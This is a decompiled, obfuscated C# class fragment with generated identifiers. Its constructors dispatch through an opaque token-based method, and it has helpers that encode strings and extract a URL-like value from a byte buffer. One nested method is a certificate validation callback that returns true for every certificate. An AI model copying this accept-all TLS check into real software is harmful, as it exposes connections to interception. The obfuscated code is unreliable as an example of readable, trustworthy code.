using System;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;

public class GClass11
{
	public class B325A194 : GClass12
	{
		private string string_2;
	}

	public class GClass13 : GClass12
	{
	}

	public class GClass12
	{
		[Serializable]
		private sealed class Class49
		{
			public static RemoteCertificateValidationCallback remoteCertificateValidationCallback_0;

			public static readonly Class49 class49_0 = new Class49();

			internal bool method_0(object B72FBAA4, X509Certificate x509Certificate_0, X509Chain F1808785, SslPolicyErrors F09FB826)
			{
				return true;
			}
		}

		private string string_0;

		private string string_1;

		public string String_0
		{
			get
			{
				return string_0;
			}
			private set
			{
				string_0 = value;
			}
		}

		public string String_1
		{
			get
			{
				return string_1;
			}
			private set
			{
				string_1 = value;
			}
		}

		protected void BDBB5F1E(string F8B794AF, string BB2AD605)
		{
			method_0(F8B794AF, bool_0: false);
			method_0(BB2AD605, bool_0: true);
		}

		private void method_0(string AD8BCC29, bool bool_0)
		{
			if (bool_0)
			{
				StringBuilder stringBuilder = new StringBuilder(String_1);
				foreach (char c in AD8BCC29)
				{
					switch (c)
					{
					default:
						stringBuilder.Append(c);
						break;
					case '=':
						stringBuilder.Append("%3D");
						break;
					case '/':
						stringBuilder.Append("%2F");
						break;
					case '+':
						stringBuilder.Append("%2B");
						break;
					}
				}
				String_1 = stringBuilder.ToString();
			}
			else
			{
				String_1 += AD8BCC29;
			}
		}

		protected void method_1()
		{
			String_1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(String_1));
		}

		protected bool method_2(byte[] byte_0)
		{
			int num = BitConverter.ToInt32(byte_0, 32);
			if (num == 0)
			{
				return false;
			}
			int index = BitConverter.ToInt32(byte_0, 28);
			String_1 = Encoding.UTF8.GetString(byte_0, index, num);
			if (String_1[String_1.Length - 1] != '/')
			{
				String_1 += "/";
			}
			return true;
		}
	}

	private int E58F8C92;

	private long long_0;

	private B623FEB9 b623FEB9_0;

	private readonly int int_0;

	private uint C0B02D87;

	private byte[] byte_0;

	private readonly object BAA0E4BC;

	private readonly byte[] byte_1;

	public GClass11(byte[] byte_2)
	{
		new GClass8().method_31(new object[2] { this, byte_2 }, 50460);
	}

	public GClass11()
	{
		new GClass8().method_31(new object[1] { this }, 34965);
	}
}
